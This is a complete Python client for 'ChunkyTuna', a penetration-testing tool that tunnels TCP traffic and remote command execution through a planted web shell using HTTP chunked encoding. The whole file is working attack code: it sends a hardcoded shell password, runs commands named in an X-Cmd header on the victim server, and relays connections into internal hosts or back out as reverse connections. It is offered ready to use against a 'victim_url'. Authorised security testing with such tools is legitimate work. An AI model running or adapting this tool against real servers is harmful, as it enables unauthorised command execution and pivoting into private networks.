#!/usr/bin/env python3
# ChunkyTuna: an evolved web shell and TCP tunnel over HTTP Chunked Encoding
#
# Lorenzo Grespan <lorenzo.grespan@pentest.co.uk>
# (c) Secarma Ltd.
#
# Thanks to: Sam Thomas for the initial prototype and all the help
#
# This entire repository is released under a GPLv3 License.


import argparse
import datetime
import logging
import random
import re
import socket
import select
import string
import ssl
import sys
import time
import threading
if sys.version_info.major >= 3:
    from urllib.parse import urlparse
else:
    from urlparse import urlparse

__version__ = '0.9.1'

log = logging.getLogger(__name__)
sh = logging.StreamHandler()
# sh.setFormatter(logging.Formatter())
# use for debugging: has line numbers and function name
fmt = formatter = logging.Formatter(
    ' :: %(funcName)s():%(lineno)d %(levelname)s - '
    '%(message)s', '%m-%d %H:%M:%S')
sh.setFormatter(fmt)
log.addHandler(sh)
log.setLevel(logging.INFO)


# might be worth playing with its size here
# BUFFER_SIZE = 16384
BUFFER_SIZE = 8192
HEARTBEAT_THRESHOLD = 2
HEARTBEAT_STRING = b'((([[[(((HEARTBEAT)))]]])))'
INITIAL_SOCKET_TIMEOUT = 30

# this must match the value in the callback
PASSWORD = b"Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y"

HTTP_SEPARATOR = b"\r\n"

# some regexp to match cookies in HTTP headers.
# orig: (r'Set-Cookie: (.*?);.*$',
# cookie_pattern = re.compile(r'Set-Cookie: (.*?);.*$', re.IGNORECASE)
# ?) is non-greedy
# (?: is a non-matching group
# match any non-whitespace character but ignores anything after ; (if present)
cookie_pattern = re.compile(r'Set-Cookie: (\S+)(?:;.*)*$', re.IGNORECASE)


def get_bytes(a_string):
    if sys.version_info < (3, 0):
        return bytes(a_string)
    else:
        return bytes(a_string, 'ASCII')


# helper function to generate the above password
def gen_pwd(len):
    p = list()
    for i in range(len):
        p.append(
            random.choice(
                string.ascii_letters + string.digits))
    return b''.join(get_bytes(p))


websock_mutex = threading.Lock()


def header_mode(mode):
    return b"X-Type: %s\r\n" % mode


# hat tip to: https://stackoverflow.com/a/42429447/204634
class CountdownTimer(threading.Thread):
    quit = False

    def run(self):
        for remaining in range(120, 0, -1):
            if self.quit:
                sys.stdout.write("\n")
                break
            sys.stdout.write("\r")
            sys.stdout.write("{:2d} seconds remaining.".format(remaining))
            sys.stdout.flush()
            time.sleep(1)


class HeartBeat(threading.Thread):
    def __init__(self, websock):
        super(HeartBeat, self).__init__()
        self.timer_lock = threading.Lock()
        self.timer = None
        self.reset_timer()

        self.quit = None
        self.websock = websock

    def stop(self):
        self.quit = True

    def reset_timer(self):
        with self.timer_lock:
            self.timer = datetime.datetime.now()

    def run(self):
        log.debug("Heartbeat started")
        try:
            while not self.quit:
                t = datetime.datetime.now() - self.timer
                if t.seconds < HEARTBEAT_THRESHOLD:
                    time.sleep(0.1)
                else:
                    with websock_mutex:
                        # log.debug("Sending heartbeat")
                        self.websock.sendall(to_chunk(HEARTBEAT_STRING))
                    # can't tell why, but this should be outside of the data
                    # mutex
                    self.reset_timer()
        except socket.error as e:
            raise SystemExit("Heartbeat error: {}".format(e))


class POSTFactory(object):
    """Used to send POST requests for each message."""
    def __init__(self, path, hostname, password):
        self.req_headers = b''.join((
            b"POST " + path + b" HTTP/1.1\r\n",
            b"Host: " + hostname + b"\r\n",
            b"X-Pwd: " + password + b"\r\n",
            b"accept-encoding: *;q=0\r\n",  # ,gzip;q=0,deflate;q=0\r\n",
            b"Transfer-Encoding: chunked\r\n",
            b"Content-Type: application/octet-stream; charset=utf-8\r\n",
        ))

    def build_request(self, my_headers, req_body, is_last=False):
        if is_last:
            req_body += to_chunk(b"")

        request = b''.join((
            self.req_headers,
            my_headers,
            HTTP_SEPARATOR,
            req_body))

        return request


class BrokenSocketException(Exception):
    pass


class TransmissionError(Exception):
    pass


class SocketFactory(object):
    def __init__(self, victim_url, no_ssl):
        self.victim_url = victim_url
        self.no_ssl = no_ssl

    def build_socket(self):
        # connect to the server
        rawsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if self.victim_url.scheme == b'https' or self.no_ssl:
            log.debug("Using SSL")
            websock = ssl.wrap_socket(rawsock, ciphers='HIGH:!DH:!aNULL')
        else:
            log.debug("No SSL")
            websock = rawsock

        _port = self.victim_url.port
        if _port is None:
            if self.victim_url.scheme == b'http':
                log.debug("Assuming remote port: 80")
                _port = 80
            elif self.victim_url.scheme == b'https':
                log.debug("Assuming remote port: 443")
                _port = 443
            else:
                print("[!] No port specified and unknown scheme")
                raise SystemExit

        try:
            # websock.connect((self.victim_url.hostname, self.victim_url.port))
            websock.connect((self.victim_url.hostname, _port))
        except socket.error as e:
            raise SystemExit(
                "[*] Cannot establish baseline connection to: {}".format(
                    self.victim_url, e))
        return websock


def send_nop_request(socket_factory, post_factory):
    """Sends a X-Nop request and grabs the cookies"""
    dummy_headers = b''.join((
        b"X-Nop: 1\r\n",
        b"Connection: close\r\n",
    ))
    req = post_factory.build_request(
        my_headers=dummy_headers,
        # no need for a body: we're initialising the
        # server-side listener
        req_body=b"",
        is_last=True)
    log.debug("Sending \n---\n{}\n---".format(req.decode()))
    websock2 = socket_factory.build_socket()
    websock2.sendall(req)
    resp_headers, resp_body, _cookies = split_headers(
        websock2.recv(BUFFER_SIZE))
    return _cookies


def split_headers(response):
    _s = response.split(b'\r\n\r\n', 1)
    if len(_s) != 2:
        print("[ ] Server returned:\n---\n{}\n---\n".format(response.decode()))
        raise SystemExit("Server did not return a valid HTTP response.")
    resp_headers, resp_body = _s
    log.debug("Response headers:\n---\n{}\n---\n".format(
        resp_headers.decode()))
    log.debug("Body consumed so far:\n---\n{}\n---\n".format(
        resp_body.decode()))

    if b'HTTP/1' not in resp_headers[:10]:
        # then it's not a full response
        log.debug("Not a full HTTP response!")
        return None, response, None

    # JSP returns "HTTP/1.1 200" not "200 OK"
    if b'200' not in resp_headers[:20]:
        print("[ ] Server did not return 200 OK; re-run with '-d' for "
              "debugging info")
        log.debug("Beginning of headers: {}".format(resp_headers[:20]))
        raise TransmissionError

    # cookie = b''
    cookies = []
    for _hdr in resp_headers.split(b'\r\n'):
        # regexp work with strings (also: headers should be ASCII)
        hdr = _hdr.decode('ASCII')
        m = cookie_pattern.match(hdr)
        if m is not None:
            log.debug("Got cookie: {}".format(m.group(1)))
            # ....aaand, turn into bytes
            cookie = get_bytes(m.group(1))
            cookies.append(cookie)
    return resp_headers, resp_body, cookies


def bake_cookies(cookies):
    # return b''.join([b'Cookie: %s\r\n' % c for c in cookies])
    return b'Cookie: %s\r\n' % b'; '.join(cookies)


def send_standalone_post(
    socket_factory,
    post_factory,
    cookies,
    data,
    counter_thread,
    mode
):
    my_headers = b''.join((
        b"User-Agent: curl/7.58.0\r\n",
        # probably not necessary
        b"Accept: */*\r\n",
        bake_cookies(cookies),
        b"X-ClientSide: 1\r\n",
        header_mode(mode),
        # close connection; send data in a new TCP stream
        b"Connection: close\r\n",
        # keep the connection alive. saves on latency
        # "Connection: keep-alive\r\n",
    ))
    # send data as a brand new POST request
    req = post_factory.build_request(
        # set a continuation header
        my_headers=my_headers,
        # no need for a body: we're initialising the
        # server-side listener
        req_body=to_chunk(data),
        # this terminates the POST with a 0 chunk, so
        # that the aspx page can read it and send it
        # over to the server-side socket
        is_last=True)
    log.debug("Sending stand-alone POST\n---\n%s\n---", req)
    # see above
    # try:
    #     log.debug("Sending stand-alone POST\n---\n{}\n---".format(
    #          req.decode()))
    # except UnicodeDecodeError:
    #     # ssh will make things iffy here. it's binary data, skip anyway...
    #     pass

    # # for keep-alive:
    # with websock_mutex:
    #     # _chunked_data = to_chunk(data)
    #     # websock.sendall(_chunked_data)
    #     websock.sendall(req)
    # # not needed actually
    # # split_headers(websock.recv(BUFFER_SIZE))

    # for new TCP streams:
    websock2 = socket_factory.build_socket()
    websock2.sendall(req)

    # IMPORTANT
    # We *need* to remove the HTTP headers
    # from the response from this first, delayed message
    # otherwise it's going to interfere with things like ssh
    if counter_thread.first_message:
        # the message will be delayed by 120s
        # IIS bug probably.
        # TODO print only if talking to an ASPX endpoint
        print("[!] The first message will be delayed "
              "by 120s. ")
        print("[!] Why? Who knows. Things will work fine "
              "afterwards. Please wait...")
        counter_thread.first_message = False
        counter_thread.start()

    # used only to check what's going on; no need to
    # check the return values. Will raise an exception
    # it's non-200 or not a HTTP response
    resp_headers, resp_body, _cookie = split_headers(
        websock2.recv(BUFFER_SIZE))
    # removed when adding support for multiple cookies
    # if _cookie != b"" and _cookie != cookie:
    #     log.warn(
    #         "Cookie value has changed. Something "
    #         "wrong with the remote session storage?.")
    #     cookie = _cookie
    # TODO catch and finally close?
    websock2.shutdown(socket.SHUT_RDWR)
    websock2.close()
    log.debug("Closed socket")
    if counter_thread.is_alive():
        # stop timer thread
        counter_thread.quit = True

    return resp_headers, resp_body, cookies


def to_chunk(what):
    # return format(len(what), 'X') + "\r\n" + what + "\r\n"
    return b"".join([
        # the trick below works for python > 3.5, if you get an error
        # use this instead:
        # get_bytes("{}".format(len(what), 'X')),
        b"%X" % len(what),
        b"\r\n",
        what,
        b"\r\n"])


def read_more(websock, howmuch):
    """Read a given quantity of bytes from a socket."""
    log.debug("Reading {} bytes from socket".format(howmuch))
    read_bytes = 0
    read_data = list()
    log.debug("Now break server socket")
    while read_bytes < howmuch:
        with websock_mutex:
            _recv = websock.recv(BUFFER_SIZE)
        if len(_recv) == 0:
            log.debug("Remote server closed the connection.")
            break
        read_data.append(_recv)
        read_bytes += len(_recv)
    return b''.join(read_data)


def read_until(websock, what, store_in=None, buffer_size=BUFFER_SIZE):
    """Read from a socket until a delimiter is found, or the socket is closed.

    The `store_in` parameter is used to submit data that has been already read
    and that might contain a partial sequence. For example,
        what = '\r\n'
        store_in = '\r'
        left in socket = '\nfoobar'
    In this case it will continue reading from the socket until the '\r\n'
    sequence is established, or the socket is closed.
    """
    if store_in is None:
        _received = list()
        last_received_chunks = b''
    else:
        # we're appending data
        _received = [store_in]
        last_received_chunks = store_in

    # read until the expected senquence is in the data (e.g. '\r\n\r\n' to
    # indicate end of HTTP headers, etc.)
    # TODO: set a maximum buffer length, or a timeout?
    while what not in last_received_chunks:
        with websock_mutex:
            _recv = websock.recv(buffer_size)
            # log.debug("received: {}".format(repr(_recv)))
        if len(_recv) == 0:
            raise BrokenSocketException(
                '[*] Remote server closed the connection.')
        _received.append(_recv)
        # need to assemble at least the last 2 chunks to check
        # whether we got '\r' and '\n\r\n' in separate chunks
        # not terribly efficient, but good enough
        last_received_chunks = b''.join(_received[-2:])
    log.debug("Spotted sequence {} in last received chunks of len {}".format(
        repr(what), len(last_received_chunks)))

    response = b''.join(_received)
    # log.debug("all received data: {}".format(repr(response)))
    return response


def read_chunks(websock, is_async, _data=None):
    """
    CORE METHOD: a generator that keeps reading chunks from a socket.

    Each call to next() will return a chunk. Remaining chunks
    are placed back into the queue to be returned next time this is
    called.
    """
    keep_reading = True
    while keep_reading:

        # Initialisation of the generator.
        #
        # Part 1: keep reading until hitting a \r\n
        # This takes care of:
        #   An empty buffer
        #   Some data in the buffer, but not yet until the last \r\n
        #
        if _data is None or b'\r\n' not in _data:
            # possible scenarios:
            #  1. There's a '\r' in raw_data but '\n' is still in the socket
            #  because the buffer length falls between those two bytes
            #  2. There's no more data to read
            # In both cases we need to keep reading
            if _data is None:
                log.debug("No data in the pipeline before reading from socket")
            if _data is not None and b"\r\n" not in _data:
                log.debug("No {}, let's read a bit more".format(repr('\r\n')))
            try:
                # XXX: there's a chance that the heartbeat will
                # send data with this socket set non-blocking but
                # as heartbeat is not concerned with responses, it is
                # not a problem
                # set the socket as non-blocking with a timeout
                # NOTE this is for *initial* timeouts
                websock.settimeout(INITIAL_SOCKET_TIMEOUT)
                # this is used in case we have a 'partial' read
                # but we use a timeout, cuz we don't want this to
                # be stuck forever if something broke on the server
                # side
                _data = read_until(websock, b'\r\n', _data)
                # re-set the socket back where it was
                websock.settimeout(None)
            except socket.timeout:
                log.debug("No data received within {}s, moving on".format(
                    INITIAL_SOCKET_TIMEOUT))
                raise
            except socket.error:
                print(
                    "[ ] Socket error when fetching data from remote server. "
                    "Timeout set to: {} Data so far: {}".format(
                        INITIAL_SOCKET_TIMEOUT,
                        repr(_data)))
                raise
            finally:
                # always executed IIRC
                websock.settimeout(None)

        # at this point either the socket was broken, or we read all data.
        # So we can continue.
        # XXX what about a partial read from the socket? Will it result
        # in some stuff in _data?

        # hack: peek into the beginning of the line;
        # (it may be a new HTTP response)
        if is_async and b'HTTP/1' in _data[:10]:
            log.debug("New HTTP response!")
            # if it's an HTTP response, get rid of the
            # headers and keep the body
            _headers, _body, _cookie = split_headers(_data)
            _data = _body

        # at this point we have a chunked body

        #
        # split around \r\n to get the chunk length
        _split = _data.split(b'\r\n', 1)
        if len(_split) != 2:
            log.debug("No more data to read")
            log.debug(repr(_data))
            raise TransmissionError("Incomplete data received")
        _len, _data = _split

        #
        # determine chunk length
        try:
            chunk_len = int(_len, base=16)
        except (TypeError, ValueError):
            print(("[ ] Received chunk length is not "
                   "a valid hex value: {}").format(repr(_len)))
            raise TransmissionError("Invalid chunk length")

        if chunk_len == 0:
            # end of data
            log.debug("Received chunk of length 0. End of data")
            if len(_data) > 0:
                # there shouldn't be any data. That is, if the remote server
                # adheres to the spec....
                log.debug(
                    "Left-over data in the pipeline:\n{}".format(repr(_data)))

            # XXX FIXME -- this was yield _data for async; but it works
            # anyway now. I can't tell why the generator should stay
            # alive.
            if is_async:
                # flush and yield the last bits
                log.debug("Async end of data. Carry on...")
                # note, sync (e.g. JSP) don't return a double \r\n after the 0
                # yield _data
                return
            else:
                # this raises a StopIteration (it's a generator)
                # TODO see help(next) and try the 'default' value
                # instead of StopIteration?
                return

        log.debug("1. This chunk length: {}. Data: {} [data len: {}]".format(
            chunk_len, repr(_data), len(_data)))

        #
        # keep reading until all 'chunk_len'
        # if not all data has been pulled from the socket, catch up! (chuck_len
        # doesn't account for the final \r\n)
        if chunk_len + 2 > len(_data):
            # but we know how much is left, so
            need_to_read = chunk_len + 2 - len(_data)
            log.debug("need to read an extra {} bytes".format(need_to_read))
            _data = b''.join([_data, read_more(websock, need_to_read)])
        # now we know _data is at least equal to chuck_len, so

        #
        # grab the first chuck_len bytes, discarding the final \r\n
        _m = _data[:chunk_len]
        log.debug(
            "Read and returning message (chunk_len: {}): {}".format(
                chunk_len, repr(_m)))

        #
        # return the first chunk to the caller and keep the rest into _data, so
        # it can be returned at the next iteration of this generator
        yield _m

        #
        # process next chunk
        log.debug(
            "Processing next chunk... at index {} of {}".format(
                chunk_len, repr(_data)))
        # note: the returned data ended with a \r\n, which is *not* part of
        # chunk_len so we must skip ahead here to discard that sequence
        # (see http spec ref on top of file)
        # XXX what if len(data) < chunk_len + 2?
        _data = _data[chunk_len + 2:]


def setup(websock, consock, inbound_data,
          SOCKET_MODE, CONNECT_IP, CONNECT_PORT):
    """Tries to verify that the server is speaking with the target."""
    if b'INIT' not in next(inbound_data):
        raise SystemExit("Server did not initialise successfully")
    print("[*] Server initialised successfully")

    # poll the current state: can be either LISTENING or SUCCESS
    current_state = next(inbound_data)
    log.debug("Current state: {}".format(current_state))

    if SOCKET_MODE == 'Connect':
        if b'LISTEN' not in current_state:
            raise SystemExit(
                "Server is not listening: {}".format(current_state))

        # now wait for a SUCCESS before continuing
        current_state = next(inbound_data)
        if b'SUCCESS' not in current_state:
            raise SystemExit("[!] Server is not ready: {}".format(
                current_state))

        log.debug(
            "Client will try to connect to {}:{}".format(
                CONNECT_IP, CONNECT_PORT))
        # TODO use encrypted sockets if requested
        try:
            consock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            consock.connect((CONNECT_IP, CONNECT_PORT))
            print("[*] Reverse connection established with {}:{}".format(
                CONNECT_IP, CONNECT_PORT))
        except socket.error as e:
            raise SystemExit(
                "Client error when connecting to {}:{}: {}".format(
                    CONNECT_IP, CONNECT_PORT, e))
    else:
        # no need to wait - server should be in SUCCESS state
        if b'SUCCESS' not in current_state:
            raise SystemExit(
                "Failure on webshell: {}".format(current_state))

    print("[*] Server connected to target successfully")
    return consock


def dispatch(
    websock,
    consock,
    inbound_data,
    thread_hb,
    counter_thread,
    post_factory,
    socket_factory,
    cookies,
    is_async,
    mode
):

    if is_async:
        print("[*] Initialising remote listener...")
        # FUNDAMENTAL - close the set-up POST
        # so that the Session can store the socket
        websock.shutdown(socket.SHUT_RDWR)
        websock.close()
        del websock
        # send a stand-alone POST to talk to the server-side client
        my_headers = b''.join((
            b'X-ServerSide: 1\r\n',
            # b'Cookie: %s\r\n' % cookie,
            bake_cookies(cookies),
            header_mode(mode),
            # This connection must be kept alive because it's where
            # the server will send continuously send data
            b"Connection: keep-alive\r\n",
        ))
        # send data as a brand new POST request
        req = post_factory.build_request(
            # set a continuation header
            my_headers=my_headers,
            # no need for a body: we're initialising the server-side listener
            req_body=b"",
            is_last=True)
        websock = socket_factory.build_socket()
        log.debug("Sending \n---\n{}\n---".format(req.decode()))
        websock.sendall(req)

        # FUNDAMENTAL - do not close the websock here! It will be used
        # by the select to listen for inbound data.
        # instead, kill the generator
        del inbound_data
        # and reset it with the new websock so that subsequent calls
        # to inbound_data.next() will retrieve the input from this connection
        inbound_data = read_chunks(websock, is_async)
        print("[*] Remote listener initialised")

        # not sure is relevant any more. FIXME remove?
        # print("[+] To establish a connection the remote socket needs to"
        #       " initiate the conversation by sending data. SSH or reverse"
        #       " shells are OK")

        # use the object as storage of this variable
        # meh. complicated.
        counter_thread.first_message = True

    socket_list = [consock, websock]
    quit = False

    while not quit:
        # blocks until one is ready
        read_sockets, write_sockets, error_sockets = select.select(
            socket_list, [], [])

        for sock in read_sockets:
            # incoming message from client
            if sock == consock:
                log.debug("Client has data")
                try:
                    # this is already bytes in python3
                    data = sock.recv(BUFFER_SIZE)
                except socket.error as e:
                    print("[*] Error when receiving data: {}".format(e))
                if len(data) == 0:
                    # socket closed
                    print('[*] Client closed connection')
                    quit = True

                # send to server
                if data:
                    log.debug("Sending {}".format(repr(data)))
                    try:
                        if is_async:
                            # In this scenario, the remote page can only
                            # read chunked-encoded inbound data when it
                            # is all sent. E.g. aspx, php (?).
                            # So the data is sent as a stand-alone
                            # HTTP POST request.
                            send_standalone_post(
                                socket_factory,
                                post_factory,
                                cookies,
                                data,
                                counter_thread,
                                mode)
                        else:
                            # JSP pages can read chunked-encoding content
                            # while it arrives. So it's all part of the
                            # same TCP stream.
                            req = to_chunk(data)
                            with websock_mutex:
                                # _chunked_data = to_chunk(data)
                                # websock.sendall(_chunked_data)
                                websock.sendall(req)
                    except socket.error as e:
                        # print, not raising BrokenSocketException
                        # so if there's any data in websock it gets sent at
                        # the next iteration of the for loop
                        print(("[*] Error when sending "
                               "data to server: {}").format(e))
                        quit = True

                # then refresh the heartbeat timer
                thread_hb.reset_timer()

            # incoming message from remote server
            elif sock == websock:
                log.debug("Server has data")
                # Read the next chunk of data (as in: content-encoded chunk).
                # This is a hex value followed by '\r\n' followed by the raw
                # data.
                # If the server had sent more than one chunk, no problem -- the
                # next select() iteration will detect more data to read, which
                # will be pulled by the next() method below and sent to the
                # 'consock' client.
                # In other words,  this polls one message at the time, and
                # leaves the rest in the socket so the select() above will
                # not block as long there's left-over stuff in the 'websock'.
                data = next(inbound_data)

                try:
                    consock.sendall(data)
                except socket.error as e:
                    print(("[*] Error when sending data "
                           "to client: {}").format(e))
                    quit = True
            else:
                # this should not happen as long as we have only two sockets.
                print("[!] Something wrong")
                quit = True


def main():
    print("[*] ChunkyTuna v{}".format(__version__))

    parser = argparse.ArgumentParser(description='Webshell tunneling script')
    parser.add_argument(
        "server",
        help="Server url e.g. http://localhost:8888/c/chunkytuna.jsp")
    parser.add_argument(
        'mode',
        type=str,
        choices=("X", "C", "L"),
        help='Server mode: (e[X]ecute, [C]onnect or [L]isten)')
    parser.add_argument(
        '-t',
        '--target',
        type=str,
        help='Target (ip:port for connect/listen or exectuable for execute)',
        required=True)
    parser.add_argument(
        '-r',
        '--receiver',
        type=str,
        help='Receiver (ip:port) or command line',
        required=True)
    parser.add_argument('--no-ssl', action="store_true")
    parser.add_argument('-d', '--debug', action='store_true')
    # XXX
    parser.add_argument('--force-cookie')
    args = parser.parse_args()

    if args.debug:
        log.setLevel(logging.DEBUG)
        log.debug("Activating debug logging...")

    victim_url = urlparse(get_bytes(args.server))

    if victim_url.hostname is None:
        raise SystemExit("No hostname specified")

    CONNECT_IP = None
    CONNECT_PORT = None
    LISTEN_INTERFACE = None
    LISTEN_PORT = None

    mode = get_bytes(args.mode)

    if mode == b'X':
            SOCKET_MODE = 'Listen'
            my_headers = b''.join((
                # "X-Type: X\r\n",
                header_mode(mode),
                b"X-Cmd: " + get_bytes(args.target) + b"\r\n",
            ))
            # my_headers = get_bytes(_my_headers)
            split_receiver = args.receiver.split(':', 1)
            LISTEN_INTERFACE = split_receiver[0]
            LISTEN_PORT = int(split_receiver[1])
            print("[+] The local client will listen on \n\t{}:{}".format(
                LISTEN_INTERFACE, LISTEN_PORT))
            print("[+] When a connection is established it will execute "
                  "\n\t{}\n on the remote server".format(args.target))
    elif mode == b'C':
            SOCKET_MODE = 'Listen'
            split_target = args.target.split(':', 1)
            my_headers = b''.join((
                # "X-Type: C\r\n",
                header_mode(mode),
                b"X-Ip: " + get_bytes(split_target[0]) + b"\r\n",
                b"X-Port: " + get_bytes(split_target[1]) + b"\r\n",
            ))
            # my_headers = get_bytes(_my_headers)
            split_receiver = args.receiver.split(':', 1)
            LISTEN_INTERFACE = split_receiver[0]
            LISTEN_PORT = int(split_receiver[1])
            print("[+] The local client will listen on \n\t{}:{}".format(
                LISTEN_INTERFACE, LISTEN_PORT))
            print("[+] When a connection is established, the remote webshell "
                  " will connect to \n\t{}:{}".format(
                      split_target[0], split_target[1]))
    elif mode == b'L':
            SOCKET_MODE = 'Connect'
            split_target = args.target.split(':', 1)
            my_headers = b''.join((
                # "X-Type: L\r\n",
                header_mode(mode),
                b"X-Ip: " + get_bytes(split_target[0]) + b"\r\n",
                b"X-Port: " + get_bytes(split_target[1]) + b"\r\n"
            ))
            # my_headers = get_bytes(_my_headers)
            split_receiver = args.receiver.split(':', 1)
            CONNECT_IP = split_receiver[0]
            CONNECT_PORT = int(split_receiver[1])
            print("[+] The remote webshell will listen for connections "
                  "on \n\t{}:{}".format(
                      split_target[0], split_target[1]))
            print("[+] When a connection is established, this client will "
                  "connect to \n\t{}:{}".format(
                      CONNECT_IP, CONNECT_PORT))
    else:
        # this should not happen with the 'choice' option above
        raise SystemExit('Unrecognised mode')

    consock = None

    # In 'Listen' mode, this client is waiting for a connection
    # from the attacker
    if SOCKET_MODE == 'Listen':
        try:
            srvsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srvsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srvsock.bind((LISTEN_INTERFACE, LISTEN_PORT))
            log.debug('[*] Bound to: ' + LISTEN_INTERFACE + ':' + str(
                LISTEN_PORT))
            srvsock.listen(1)
            print('[*] Listening for incoming connection')
            (consock, address) = srvsock.accept()
            print('[*] Connection from '
                  + str(address[0])
                  + ':'
                  + str(address[1]))
        except socket.error as e:
            raise SystemExit(e)

    # initialise factories for later
    post_factory = POSTFactory(victim_url.path, victim_url.hostname, PASSWORD)
    socket_factory = SocketFactory(victim_url, args.no_ssl)

    ###
    #
    # POST request

    if victim_url.path.endswith(b".aspx") or victim_url.path.endswith(b".php"):
        is_async = True
    else:
        is_async = False

    # send dummy X-Nop:1 because the session storage
    # might take a few tries before starting up. Go figure.
    if is_async:
        _cookies = []
        _counter = 10
        try:
            while len(_cookies) == 0:
                _cookies = send_nop_request(socket_factory, post_factory)
                log.debug("After dummy POST, cookies: {}".format(
                    [c.decode() for c in _cookies]))
                _counter -= 1
                # FIXME - don't send too many or php will respond
                # with a ton of cookies in the same response
                time.sleep(1)
                if _counter == 0:
                    raise SystemExit("Remote end did not send a cookie."
                                     " Cannot initialise session.")
        except TransmissionError:
            raise SystemExit

    # build the initial POST request
    if is_async:
        # initialise the whole thing
        my_headers += b"X-Init: 1\r\n"
        if args.force_cookie is not None:
            my_headers += bake_cookies([get_bytes(args.force_cookie)])
        # it's async; drop the connection
        my_headers += b"Connection: close\r\n"
    else:
        # we can tunnel all in the same connection
        my_headers += b"Connection: keep-alive\r\n"
    req = post_factory.build_request(my_headers, b"", is_async)
    log.debug("sending:\n---\n{}\n---\n".format(req.decode()))

    #
    ####

    ###
    #
    # Initial connection

    websock = socket_factory.build_socket()
    try:
        websock.settimeout(5)
        with websock_mutex:
            websock.sendall(req)
        initial_response = read_until(websock, b'\r\n\r\n')
        websock.settimeout(None)
    except socket.error as e:
        # this handles the websock.sendall exceptions
        raise SystemExit("Socket error: {}".format(e))
    except BrokenSocketException as e:
        raise SystemExit(e)
    except KeyboardInterrupt:
        print("User interrupt")
        raise SystemExit

    resp_headers, resp_body, cookies = split_headers(initial_response)

    if args.force_cookie is not None:
        log.debug("Forcing cookie: {}".format(args.force_cookie))
        cookies += [get_bytes(args.force_cookie)]
    print("[*] Connection with web server established")

    # start HB thread after the connection has been established
    thread_hb = HeartBeat(websock)
    thread_hb.daemon = True
    if not is_async:
        # note: even if the server is slow in responding because it's trying to
        # connect to a host (for the 'L' mode), we should assume it's alive so
        # let's keep poking it anyway. Worst case scenario we're sending
        # heartbeats to /dev/null
        thread_hb.start()

    # this will be started later, at the first client message
    # in an async scenario
    counter_thread = CountdownTimer()

    try:
        # this 'chunks' is a generator; when polled with
        # .next() it will read and return data from the
        # server-side component
        inbound_data = read_chunks(websock, is_async, resp_body)
        # tell the web page to get their stuff in order (connect where needed,
        # etc.)
        consock = setup(
            websock,
            consock,
            inbound_data,
            SOCKET_MODE,
            CONNECT_IP,
            CONNECT_PORT)
        # rock and roll. This will keep running until a socket is broken
        dispatch(
            websock,
            consock,
            inbound_data,
            thread_hb,
            counter_thread,
            post_factory,
            socket_factory,
            cookies,
            is_async,
            mode)
    except StopIteration:
        raise SystemExit("Remote closed connection")
    except socket.error as e:
        # error when sending data to the client
        # (using sendall() on the sockets)
        raise SystemExit("Socket error: {}".format(e))
    except BrokenSocketException as e:
        raise SystemExit(e)
    except TransmissionError as e:
        raise SystemExit(e)
    except KeyboardInterrupt:
        raise SystemExit("User interrupt")
    finally:
        log.debug("Stopping heartbeat...")
        thread_hb.stop()
        if thread_hb.is_alive():
            log.debug("Waiting for heartbeat to stop...")
            thread_hb.join()
        if counter_thread.is_alive():
            # stop timer thread
            counter_thread.quit = True

        if consock is not None:
            # because if there's a failure during setup()
            # the consock might not even be initialised
            log.debug("Closing connection to server side...")
            try:
                consock.shutdown(socket.SHUT_RDWR)
                consock.close()
            except socket.error:
                print("[!] Local console already closed")
                pass

    print("[*] All done.")


if __name__ == '__main__':
    main()
